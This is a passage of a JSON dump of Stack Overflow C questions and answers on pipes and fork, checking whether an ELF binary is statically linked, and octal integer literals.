descriptors for the two ends of the pipe are placed in fds. */\npipe (fds);\n/* Fork a child process. */ \npid = fork ();\nif (pid == (pid_t) 0) {\n/* Child proces -. Close the write end of the file descriptor. */\nclose (fds[1]);\n/* Connect the read end of the pipe to standard input. */\ndup2 (fds[0], STDIN_FILENO);\n/* Replace the child process with the \u201crev\u201d program. */\nexeclp(\"rev\", \"rev\", 0); }\n\nelse {\n/* This is the parent process. */\n    FILE* stream;\n/* Close the read end of the file descriptor. */\n    close (fds[0]);\n/* Convert the write file descriptor to a FILE object */\n    stream = fdopen (fds[1], \"w\");\n    fprintf (stream, \",ereh ot ereht morF\\n\");\n    fprintf (stream, \",ereht ot ereh dna\\n\");\n    fprintf (stream, \".erehwyreve era sgniht ynnuf\\n\"); \n    fprintf (stream, \"ssueS .rD - \\n\");\n    fflush (stream);\n    close (fds[1]);\n/* Wait for the child process to finish. */\n    waitpid (pid, NULL, 0);\n}\n    return 0; \n}\n</code></pre>\n"}, {"tags": ["c", "linux", "static", "elf"], "comments": [{"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 0, "creation_date": 1544579010, "post_id": 53734890, "comment_id": 94323231, "body": "You <i>can</i> do this by opening the file and parsing the ELF headers by hand.  Are you allowed to use a library?"}, {"owner": {"reputation": 1, "user_id": 10778512, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1bd4bc9d6954a51da64a9491cab1e62?s=128&d=identicon&r=PG&f=1", "display_name": "Jordan Miller", "link": "https://stackoverflow.com/users/10778512/jordan-miller"}, "reply_to_user": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 0, "creation_date": 1544579077, "post_id": 53734890, "comment_id": 94323247, "body": "no, as few as library as possible, im trying to keep it as native as possible"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 1, "creation_date": 1544579360, "post_id": 53734890, "comment_id": 94323308, "body": "If you are attempting this as some sort of security measure, it is likely impossible in general, as a program could contain no overt call to <code>system</code> or other concerning routines or system calls in its machine instructions but could construct such instructions during execution in various ways."}, {"owner": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 0, "creation_date": 1544584035, "post_id": 53734890, "comment_id": 94324222, "body": "Maybe you could do open the file in binary and search for strings that are part of the standard library and unlikely to be in a user application?  I&#39;m thinking &quot;Undefined error&quot; in <code>perror()</code> and the like."}, {"owner": {"reputation": 194515, "user_id": 379897, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/73c5967cf90e62b10d34b1d2d0ad3aae?s=128&d=identicon&r=PG", "display_name": "R.. GitHub STOP HELPING ICE", "link": "https://stackoverflow.com/users/379897/r-github-stop-helping-ice"}, "edited": false, "score": 0, "creation_date": 1544637617, "post_id": 53734890, "comment_id": 94350144, "body": "As noted in the comments on my answer, it&#39;s not clear how to parse the question. Can you please clarify what you&#39;re asking so I know if my answer is meaningful as written or should be replaced or deleted?"}], "answers": [{"comments": [{"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1544623157, "post_id": 53735462, "comment_id": 94341709, "body": "Does that distinguish between <code>int main(void) { system(&quot;foo&quot;); }</code> and <code>int main(void) {}</code>, which is what I think OP wants?"}, {"owner": {"reputation": 194515, "user_id": 379897, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/73c5967cf90e62b10d34b1d2d0ad3aae?s=128&d=identicon&r=PG", "display_name": "R.. GitHub STOP HELPING ICE", "link": "https://stackoverflow.com/users/379897/r-github-stop-helping-ice"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1544626099, "post_id": 53735462, "comment_id": 94343447, "body": "@EricPostpischil: On furthere reading, I&#39;m not clear on how to parse OP&#39;s question. I thought OP was asking for a way to answer &quot;is this binary file statically linked?&quot; without invoking a command like <code>file</code> or <code>readelf</code> to perform this check. If OP wants to know if the program invokes commands or operates on the filesystem, and the program is from unknown and potentially malicious source, the answer is simply that <b>there is no way to do this</b>."}, {"owner": {"reputation": 1, "user_id": 10778512, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1bd4bc9d6954a51da64a9491cab1e62?s=128&d=identicon&r=PG&f=1", "display_name": "Jordan Miller", "link": "https://stackoverflow.com/users/10778512/jordan-miller"}, "edited": false, "score": 0, "creation_date": 1544648105, "post_id": 53735462, "comment_id": 94355076, "body": "im asking if another program was compiled statically without using system() in the primary program that im writing, the program im writing cannot execute shell commands like system(&quot;file path/to/file&quot;);"}, {"owner": {"reputation": 194515, "user_id": 379897, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/73c5967cf90e62b10d34b1d2d0ad3aae?s=128&d=identicon&r=PG", "display_name": "R.. GitHub STOP HELPING ICE", "link": "https://stackoverflow.com/users/379897/r-github-stop-helping-ice"}, "reply_to_user": {"reputation": 1, "user_id": 10778512, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1bd4bc9d6954a51da64a9491cab1e62?s=128&d=identicon&r=PG&f=1", "display_name": "Jordan Miller", "link": "https://stackoverflow.com/users/10778512/jordan-miller"}, "edited": false, "score": 0, "creation_date": 1544648593, "post_id": 53735462, "comment_id": 94355270, "body": "@JordanMiller: OK. In that case my answer applies."}], "tags": [], "owner": {"reputation": 194515, "user_id": 379897, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/73c5967cf90e62b10d34b1d2d0ad3aae?s=128&d=identicon&r=PG", "display_name": "R.. GitHub STOP HELPING ICE", "link": "https://stackoverflow.com/users/379897/r-github-stop-helping-ice"}, "is_accepted": false, "score": 3, "last_activity_date": 1544583898, "creation_date": 1544583898, "answer_id": 53735462, "question_id": 53734890, "link": "https://stackoverflow.com/questions/53734890/how-to-check-if-a-program-was-statically-compiled-in-c/53735462#53735462", "title": "How to check if a program was statically compiled in c", "body": "<p>Assuming ELF, parse the Ehdr to find the program headers (Phdrs), then look for one of type <code>PT_INTERP</code>. The program is static linked if this program header is absent. The relevant data structures can be found in <code>elf.h</code>.</p>\n"}], "owner": {"reputation": 1, "user_id": 10778512, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1bd4bc9d6954a51da64a9491cab1e62?s=128&d=identicon&r=PG&f=1", "display_name": "Jordan Miller", "link": "https://stackoverflow.com/users/10778512/jordan-miller"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 150, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1544587294, "creation_date": 1544578789, "last_edit_date": 1544587294, "question_id": 53734890, "link": "https://stackoverflow.com/questions/53734890/how-to-check-if-a-program-was-statically-compiled-in-c", "title": "How to check if a program was statically compiled in c", "body": "<p>How would you able to check if another program was statically compiled without using <code>system()</code> or <code>stat()</code> or any other <code>shell execution commands</code></p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 23130, "user_id": 8586227, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BRnwg.png?s=128&g=1", "display_name": "Davis Herring", "link": "https://stackoverflow.com/users/8586227/davis-herring"}, "edited": false, "score": 1, "creation_date": 1544581488, "post_id": 53734825, "comment_id": 94323745, "body": "You can\u2019t, in general, <code>wait</code> on a process that is writing to a pipe that has no readers (yet).  Deadlock will result (if much data is written)."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1544594661, "post_id": 53734825, "comment_id": 94326784, "body": "They invented arrays so you shouldn&#39;t have to write the same code out three times.  Use <code>char str[][20] = { &quot;Hello 1&quot;, &quot;Hello 2&quot;, &quot;Hello 3&quot; };</code> or similar."}, {"owner": {"reputation": 1176, "user_id": 3540204, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a7bd7e65e4e80927742ae3726e236fa?s=128&d=identicon&r=PG&f=1", "display_name": "petre", "link": "https://stackoverflow.com/users/3540204/petre"}, "edited": false, "score": 0, "creation_date": 1544595081, "post_id": 53734825, "comment_id": 94326917, "body": "Don&#39;t wait in the parent, just create the four children (As and B)? But be aware also that writing in pipes is not atomic (it is for a certain number of characters, PIPE_BUF if I remember correctly), so strings from A processes might get mixed up."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 1176, "user_id": 3540204, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a7bd7e65e4e80927742ae3726e236fa?s=128&d=identicon&r=PG&f=1", "display_name": "petre", "link": "https://stackoverflow.com/users/3540204/petre"}, "edited": false, "score": 0, "creation_date": 1544595573, "post_id": 53734825, "comment_id": 94327106, "body": "@petre: You&#39;re right that writes are atomic up to a the size <code>PIPE_BUF</code>, but there&#39;s no risk of interference here because each of the first three children writes on a different pipe."}, {"owner": {"reputation": 1176, "user_id": 3540204, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a7bd7e65e4e80927742ae3726e236fa?s=128&d=identicon&r=PG&f=1", "display_name": "petre", "link": "https://stackoverflow.com/users/3540204/petre"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1544596171, "post_id": 53734825, "comment_id": 94327293, "body": "@JonathanLeffler: of course you are correct. Now I see the code overwrites the pipe descriptors in the parent in each loop, so it cannot possible read from all of them afterwards."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 1176, "user_id": 3540204, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a7bd7e65e4e80927742ae3726e236fa?s=128&d=identicon&r=PG&f=1", "display_name": "petre", "link": "https://stackoverflow.com/users/3540204/petre"}, "edited": false, "score": 0, "creation_date": 1544596280, "post_id": 53734825, "comment_id": 94327345, "body": "@petre \u2014 that too (overwritten pipe descriptors).  As noted in my answer, implicitly, by creating the 2D array <code>fd</code> instead of the 1D array."}], "answers": [{"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 2, "last_activity_date": 1544596435, "last_edit_date": 1544596435, "creation_date": 1544596058, "answer_id": 53737264, "question_id": 53734825, "link": "https://stackoverflow.com/questions/53734825/pipe-between-children/53737264#53737264", "title": "Pipe between children", "body": "<p>You need to make a number of changes to the code.  The parent shouldn't really wait on its children until after they're all launched.  Since you create a new pipe for each of the first three children, you need to keep track of which file descriptors are in use.  You should use arrays for that, and for the strings to be sent.  Neither the <code>read()</code> nor the <code>write()</code> system calls  null-terminates strings, and you don't tell it to write a null byte at the end, so you need to tell <code>printf()</code> to print the correct information.</p>\n\n<p>Those changes and sundry others lead to:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\n#define MAX_CHILDREN 3\n\nint main(void)\n{\n    pid_t pid;\n    int fd[MAX_CHILDREN][2];\n    char buffer[100];\n    const char *str[MAX_CHILDREN] = { \"Hello 1\", \"Hello 2\", \"Hello 3\" };\n\n    for (int i = 0; i &lt; MAX_CHILDREN; i++)\n    {\n        if (pipe(fd[i]) == -1)\n        {\n            perror(\"pipe Failed\");\n            exit(1);\n        }\n        pid = fork();\n        if (pid &lt; 0)\n        {\n            perror(\"fork failed\");\n            exit(1);\n        }\n        if (pid == 0)\n        {\n            printf(\"Child %i (pid= %i) send string %s\\n\", i + 1, getpid(), str[i]);\n            write(fd[i][1], str[i], strlen(str[i]));\n            exit(i + 1);\n        }\n    }\n\n    pid = fork();\n\n    if (pid &lt; 0)\n    {\n        perror(\"fork failed\");\n        exit(1);\n    }\n    if (pid == 0)\n    {\n        printf(\"The new process %i read fd pipe\\n\", getpid());\n        for (int i = MAX_CHILDREN; i-- &gt; 0; )\n        {\n            int nbytes;\n            if ((nbytes = read(fd[i][0], buffer, sizeof(buffer))) &lt;= 0)\n            {\n                perror(\"error read\");\n                exit(EXIT_FAILURE);\n            }\n            printf(\"String read: %.*s\\n\", nbytes, buffer);\n        }\n        exit(4);\n    }\n\n    int corpse;\n    int status;\n    while ((corpse = wait(&amp;status)) &gt;= 0)\n        printf(\"child %d exited with status 0x%.4X\\n\", corpse, status);\n    return 0;\n}\n</code></pre>\n\n<p>When run, the output might be:</p>\n\n<pre><code>Child 1 (pid= 91027) send string Hello 1\nChild 2 (pid= 91028) send string Hello 2\nChild 3 (pid= 91029) send string Hello 3\nThe new process 91030 read fd pipe\nString read: Hello 3\nString read: Hello 2\nString read: Hello 1\nchild 91027 exited with status 0x0100\nchild 91028 exited with status 0x0200\nchild 91029 exited with status 0x0300\nchild 91030 exited with status 0x0400\n</code></pre>\n\n<p>I reversed the order of the elements in the reading loop, mainly just for fun.  You can use a conventional <code>for (int i = 0; i &lt; MAX_CHILDREN; i++)</code> loop instead if you prefer.</p>\n\n<p>Although it isn't crucial in this program, you aren't closing enough file descriptors in the children or the parent.  The parent should close the write ends of the pipes; it isn't going to be using them.  The children should close the read ends of the pipes; they aren't going to be using them.  Further, the second and third children should close the pipes opened for the first, and the third should close the pipe for the second, as they aren't going to use those, either.  If you don't do this and the fourth child looped waiting for EOF (0 bytes returned), it would hang.</p>\n\n<p><strong>Rule of thumb</strong>: If you\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/dup2.html\" rel=\"nofollow noreferrer\"><code>dup2()</code></a>\none end of a pipe to standard input or standard output, close both of the\noriginal file descriptors returned by\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/pipe.html\" rel=\"nofollow noreferrer\"><code>pipe()</code></a>\nas soon as possible.\nIn particular, you should close them before using any of the\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/execvp.html\" rel=\"nofollow noreferrer\"><code>exec*()</code></a>\nfamily of functions.</p>\n\n<p>The rule also applies if you duplicate the descriptors with either\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/dup.html\" rel=\"nofollow noreferrer\"><code>dup()</code></a>\nor\n<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/fcntl.html\" rel=\"nofollow noreferrer\"><code>fcntl()</code></a>\nwith <code>F_DUPFD</code></p>\n\n<hr>\n\n<p>Note that an alternative design for the program would create a single pipe outside the loop and the children would all write to the same pipe.  You'd probably want to add a newline to the message strings so that the results are separate.  You'd definitely want to think about looping the read in the fourth child, and you'd need to worry about the pipe being closed properly, and so on.  It'd be a worthwhile sub-exercise to code that.</p>\n"}], "owner": {"reputation": 315, "user_id": 7802118, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8b7f749e887418ae2ea8929eb536af25?s=128&d=identicon&r=PG&f=1", "display_name": "Chariot", "link": "https://stackoverflow.com/users/7802118/chariot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "accepted_answer_id": 53737264, "answer_count": 1, "score": 1, "last_activity_date": 1544596435, "creation_date": 1544578233, "last_edit_date": 1544594375, "question_id": 53734825, "link": "https://stackoverflow.com/questions/53734825/pipe-between-children", "title": "Pipe between children", "body": "<p>I want to do a program that first creates 3 processes (A) and later, creates one process more (B) and these first processes must write in a pipe that the last process read each time that process write. \nI tried something but I don't know the way to do that because the process (B) is created after the processes (A)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define MAX_CHILDREN 3\n\nint main(int argc, char *argv[])\n{\n    pid_t pid;\n\n    int fd[2];\n\n    char buffer[100];\n\n    char str[] = \"Hello\";\n    char str2[] = \"Hello2\";\n    char str3[] = \"Hello3\";\n\n    for(int num_process = 0; num_process &lt; MAX_CHILDREN; num_process++)\n    {\n        if(pipe(fd) == -1)\n        {\n            perror( \"pipe Failed\" );\n            continue;\n        }\n\n        pid = fork();\n\n        if(pid &lt; 0)\n        {\n            perror(\"fork failed\");\n            exit(1);\n        }\n\n        if(pid == 0)\n        { //child code\n\n        if(num_process == 0){\n                printf(\"Child %i (pid= %i) send string %s\\n\", num_process, getpid(),str);\n                write(fd[1],str,strlen(str));\n            }\n        if(num_process == 1){\n                printf(\"Child %i (pid= %i) send string %s\\n\", num_process, getpid(),str2);\n                write(fd[1],str2,strlen(str2));\n        }\n        if(num_process == 2){\n                printf(\"Child %i (pid= %i) send string %s\\n\", num_process, getpid(),str3);\n                write(fd[1],str3,strlen(str3));\n        }\n            exit(0);\n        }\n\n        else{//parent\n            printf(\"Im parent %i\\n\",getpid());\n            wait(NULL);\n        }\n    }\n\n    //Creating another child process from parent, this process recieves string sent from\n    //childs\n    pid = fork();\n\n        if(pid &lt; 0)\n        {\n            perror(\"fork failed\");\n            exit(1);\n        }\n    if(pid == 0){//child\n    printf(\"The new process %i read fd pipe\\n\",getpid());\n    if( read(fd[0],buffer,sizeof(buffer)) &lt;= 0) //read pipe\n    {\n        perror(\"error read\");\n        exit( EXIT_FAILURE );\n    }\n    printf(\"String readed : %s\\n\",buffer);\n    }\n    else{//parent\n        wait(NULL);\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "octal"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1544577526, "post_id": 53734687, "comment_id": 94322978, "body": "When you write <code>int x = 0;</code>, you&#39;re writing an octal constant, not a decimal one (see C11 <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.4.4.1\" rel=\"nofollow noreferrer\">&#167;6.4.4.1 Integer constants</a>).  A zero (not followed by <code>x</code> or <code>X</code> \u2014 or, in some circles, <code>b</code> or <code>B</code>) indicates an octal constant."}, {"owner": {"reputation": 767708, "user_id": 14860, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/vXG1F.png?s=128&g=1", "display_name": "paxdiablo", "link": "https://stackoverflow.com/users/14860/paxdiablo"}, "edited": false, "score": 0, "creation_date": 1544578334, "post_id": 53734687, "comment_id": 94323122, "body": "Darkfall, since you&#39;ve been a member for nearly four years, on the off-chance you haven&#39;t actually read the help stuff yet, it&#39;s well worth doing: <a href=\"https://stackoverflow.com/help\">stackoverflow.com/help</a>, specifically why some questions get closed (<a href=\"https://stackoverflow.com/help/closed-questions\">stackoverflow.com/help/closed-questions</a>). That way, you&#39;ll know to search first to see if the question has already been asked and answered and you won&#39;t have to waste your time waiting for another answer or, more likely, getting shut down as a duplicate :-) This is not meant as criticism by the way, I&#39;m just trying to help out a fellow traveler."}, {"owner": {"reputation": 13, "user_id": 4627219, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/01a7fb3955e3c33ca49a75b49c1bc308?s=128&d=identicon&r=PG&f=1", "display_name": "darkfall94", "link": "https://stackoverflow.com/users/4627219/darkfall94"}, "edited": false, "score": 0, "creation_date": 1544578962, "post_id": 53734687, "comment_id": 94323220, "body": "Yes, I understand this was a silly question and I should have looked for past answers before posting this. Sorry about this."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 4627219, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/01a7fb3955e3c33ca49a75b49c1bc308?s=128&d=identicon&r=PG&f=1", "display_name": "darkfall94", "link": "https://stackoverflow.com/users/4627219/darkfall94"}, "edited": false, "score": 0, "creation_date": 1544577429, "post_id": 53734718, "comment_id": 94322962, "body": "aah! yes ofcourse, thank you!"}], "tags": [], "owner": {"reputation": 44820, "user_id": 4492932, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e8938ef2681650e100bc9f83434ef272?s=128&d=identicon&r=PG", "display_name": "DYZ", "link": "https://stackoverflow.com/users/4492932/dyz"}, "is_accepted": true, "score": 0, "last_activity_date": 1544577609, "last_edit_date": 1544577609, "creation_date": 1544577337, "answer_id": 53734718, "question_id": 53734687, "link": "https://stackoverflow.com/questions/53734687/incorrect-macro-conversion-to-int-when-printing/53734718#53734718", "title": "incorrect macro conversion to int when printing", "body": "<p>Numbers starting with a 0 are treated as octal in C. <code>010000</code> is an integer literal written in the octal notation. Its value is <code>8**4=4096</code>. Remove the first 0.</p>\n"}], "owner": {"reputation": 13, "user_id": 4627219, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/01a7fb3955e3c33ca49a75b49c1bc308?s=128&d=identicon&r=PG&f=1", "display_name": "darkfall94", "link": "https://stackoverflow.com/users/4627219/darkfall94"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 26, "favorite_count": 0, "closed_date": 1544577738, "accepted_answer_id": 53734718, "answer_count": 1, "score": -1, "last_activity_date": 1544577609, "creation_date": 1544577136, "last_edit_date": 1544577447, "question_id": 53734687, "link": "https://stackoverflow.com/questions/53734687/incorrect-macro-conversion-to-int-when-printing", "closed_reason": "Duplicate", "title": "incorrect macro conversion to int when printing", "body": "<p>So I have the following code:</p>\n\n<pre><code>#define x 010000\n</code></pre>\n\n<p>My intention is to define x as '10000' in decimal but when I print out the above code it gets printed as 4096.\nI dont understand how is that being translated to 4096.\nCould anyone please explain?</p>\n"}]